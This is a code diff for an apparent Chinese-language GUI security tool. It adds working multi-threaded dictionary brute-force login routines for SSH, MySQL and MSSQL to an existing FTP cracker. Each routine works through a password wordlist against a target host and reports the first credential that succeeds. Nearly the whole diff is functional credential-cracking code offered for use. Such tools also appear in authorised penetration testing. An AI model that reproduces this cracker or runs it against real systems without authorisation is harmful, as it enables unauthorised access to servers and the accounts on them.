@@ -1,17 +1,15 @@
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
 """
-Copyright (c) 2017-2017 01 Security Team
+Copyright (c) 2017 01 Security Team
 Its Support Mysql、Mssql、ssh
 """
 
 import time, queue, threading
 from .util import *
-# import pymysql
-# import pymssql
-# import paramiko
+
+import tkinter.messagebox
 from ftplib import FTP
-from tkinter import filedialog
 
 q_pwds = None
 _crack_len = 0
@@ -41,13 +39,16 @@ def change_cbox(event, type, ports):
 
 # 点击开始爆破事件
 def crack_port(type, ipaddrs, ports, threads, name, filename, btn_crack, crack_result, pbar_crack):
+    if not ipaddrs or not ports or not name:
+        tkinter.messagebox.showinfo('01sec', 'input')
+        return
+    global q_pwds
+    global _crack_len
+    global _crack_flag
+    global _crack_running
     if type == 'ftp':
         # 获取密码 queue格式
-        global q_pwds
         q_pwds = get_dict(filename)
-        global _crack_len
-        global _crack_flag
-        global _crack_running
         _crack_flag.set()
         _crack_running.set()
         pbar_crack['maximum'] = q_pwds.qsize()
@@ -57,34 +58,129 @@ def crack_port(type, ipaddrs, ports, threads, name, filename, btn_crack, crack_r
         for i in range(threads):
             t = threading.Thread(target=crack_ftp, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
             t.start()
-    # elif type == 'mysql':
-    #     for i in range(threads):
-    #         t = threading.Thread()
+    elif type == 'mysql':
+        try:
+            global pymysql
+            import pymysql
+        except:
+            tkinter.messagebox.showinfo('01sec', '需安装pymysql模块')
+            return
+        q_pwds = get_dict(filename)
+        _crack_flag.set()
+        _crack_running.set()
+        pbar_crack['maximum'] = q_pwds.qsize()
+        _crack_len = 0
+        btn_crack['state'] = DISABLED
+        crack_result.delete('0.0', END)
+        for i in range(threads):
+            t = threading.Thread(target=crack_mysql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
+            t.start()
+    elif type == 'ssh':
+        try:
+            global paramiko
+            import paramiko
+        except:
+            tkinter.messagebox.showinfo('01sec', '需安装paramiko模块')
+            return
+        q_pwds = get_dict(filename)
+        _crack_flag.set()
+        _crack_running.set()
+        pbar_crack['maximum'] = q_pwds.qsize()
+        _crack_len = 0
+        btn_crack['state'] = DISABLED
+        crack_result.delete('0.0', END)
+        for i in range(threads):
+            t = threading.Thread(target=crack_ssh, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
+            t.start()
+    elif type == 'mssql':
+        try:
+            global pymssql
+            import pymssql
+        except:
+            tkinter.messagebox.showinfo('01sec', '需安装pymssql模块')
+            return
+        q_pwds = get_dict(filename)
+        _crack_flag.set()
+        _crack_running.set()
+        pbar_crack['maximum'] = q_pwds.qsize()
+        _crack_len = 0
+        btn_crack['state'] = DISABLED
+        crack_result.delete('0.0', END)
+        for i in range(threads):
+            t = threading.Thread(target=crack_mssql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
+            t.start()
+    elif type == 'rdp':
+        tkinter.messagebox.showinfo('01sec', '功能正在研发......')
     else:
         return
 
 
-def crack_ssh(ipaddrs, port, name, pwd, crack_result):
-    # 爆破
-    '''
+def crack_ssh(ipaddrs, port, name, pwd, crack_result, pbar_crack):
     ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(ipaddrs, int(port), name, pwd)
-    ssh.close()
-    '''
-    # 输出结果
-    # crack_result.insert(END, 'xxx\n')
+    while _crack_running.isSet():
+        while not pwd.empty():
+            try:
+                _crack_flag.wait()
+                temp_pwd = pwd.get().replace('\n', '')
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(ipaddrs, int(port), name, temp_pwd)
+                ssh.close()
+                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
+                crack_result.insert(END, result + '\n')
+                return
+            except Exception as e:
+                print(e)
+                pass
+            finally:
+                if _crack_lock.acquire():
+                    global _crack_len
+                    _crack_len = _crack_len + 1
+                    pbar_crack['value'] = _crack_len
+                    _crack_lock.release()
 
 
-def crack_mysql(host, port, name, pwd):
-    pymysql.connect(host=host,
-                    port=int(port),
-                    user=name,
-                    password=pwd)
+def crack_mysql(ipaddrs, port, name, pwd, crack_result, pbar_crack):
+    while _crack_running.isSet():
+        while not pwd.empty():
+            try:
+                _crack_flag.wait()
+                temp_pwd = pwd.get().replace('\n', '')
+                db = pymysql.connect(str(ipaddrs), int(port), name, temp_pwd)
+                db.close()
+                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
+                crack_result.insert(END, result + '\n')
+                return
+            except Exception as e:
+                print(e)
+                pass
+            finally:
+                if _crack_lock.acquire():
+                    global _crack_len
+                    _crack_len = _crack_len + 1
+                    pbar_crack['value'] = _crack_len
+                    _crack_lock.release()
 
 
-def crack_mssql(host, port):
-    pass
+def crack_mssql(ipaddrs, port, name, pwd, crack_result, pbar_crack):
+    while _crack_running.isSet():
+        while not pwd.empty():
+            try:
+                _crack_flag.wait()
+                temp_pwd = pwd.get().replace('\n', '')
+                db = pymssql.connect(str(ipaddrs), int(port), name, temp_pwd)
+                db.close()
+                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
+                crack_result.insert(END, result + '\n')
+                return
+            except Exception as e:
+                print(e)
+                pass
+            finally:
+                if _crack_lock.acquire():
+                    global _crack_len
+                    _crack_len = _crack_len + 1
+                    pbar_crack['value'] = _crack_len
+                    _crack_lock.release()
 
 
 def crack_ftp(ipaddrs, port, name, pwd, crack_result, pbar_crack):
